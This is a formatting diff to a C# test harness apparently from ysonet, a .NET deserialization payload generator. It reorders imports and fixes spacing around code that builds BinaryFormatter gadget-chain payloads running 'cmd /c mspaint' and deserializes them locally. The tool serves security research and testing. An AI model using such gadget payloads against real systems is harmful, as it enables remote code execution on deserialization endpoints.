@@ -1,22 +1,14 @@
-﻿using System;
+﻿using NDesk.Options;
+using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using NDesk.Options;
-using ysonet.Generators;
-using System.IO;
-using System.Diagnostics;
-using Newtonsoft.Json.Linq;
-using System.Text.RegularExpressions;
-using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
-using System.Web.UI.WebControls;
 using System.Configuration;
-using System.Collections.Specialized;
-using System.Reflection;
-using System.Windows.Data;
-using System.Runtime.Serialization;
 using System.Drawing;
+using System.IO;
+using System.Reflection;
+using System.Runtime.Serialization;
+using System.Text;
+using ysonet.Generators;
+using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
 
 namespace ysonet.Helpers.TestingArena
 {
@@ -52,7 +44,7 @@ namespace ysonet.Helpers.TestingArena
             //ActivitySurrogateSelector();
             //SpoofByBinaryFormatterJson();
             //DisableActivitySurrogateSelectorTypeCheckReader();
-            
+
             //Console.ReadLine();
         }
 
@@ -73,13 +65,13 @@ namespace ysonet.Helpers.TestingArena
 
             sampleInputArgs = new InputArgs("cmd /c mspaint", true, false, true, false, true, new List<string>() { "--var", "2" });
 
-            var serialized = (byte[]) new ActivitySurrogateDisableTypeCheckGenerator().GenerateWithInit("BinaryFormatter", sampleInputArgs);
+            var serialized = (byte[])new ActivitySurrogateDisableTypeCheckGenerator().GenerateWithInit("BinaryFormatter", sampleInputArgs);
 
             try
             {
                 SerializersHelper.BinaryFormatter_deserialize(serialized);
             }
-            catch(Exception e)
+            catch (Exception e)
             {
 
             }
@@ -338,7 +330,7 @@ namespace ysonet.Helpers.TestingArena
             fmt.Serialize(lsMs, ls);
             //lsMs.Position = 0;
             //fmt.Deserialize(lsMs);
-            
+
             byte[] bf_byte = lsMs.ToArray();
             Console.WriteLine("Init size: " + bf_byte.Length);
             string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(bf_byte), false, true, true);
@@ -381,7 +373,7 @@ namespace ysonet.Helpers.TestingArena
             string myApp = "TestConsoleApp_YSONET";
             sampleInputArgs = new InputArgs(myApp + " /foo bar", true, false, false, false, true, null);
             bool isErrOk = false;
-            
+
             TypeConfuseDelegateGenerator tcdg = new TypeConfuseDelegateGenerator();
             byte[] tcd_bf_byte = (byte[])tcdg.GenerateWithNoTest("binaryformatter", sampleInputArgs);
             string json_string = AdvancedBinaryFormatterParser.StreamToJson(new MemoryStream(tcd_bf_byte), false, true, true);
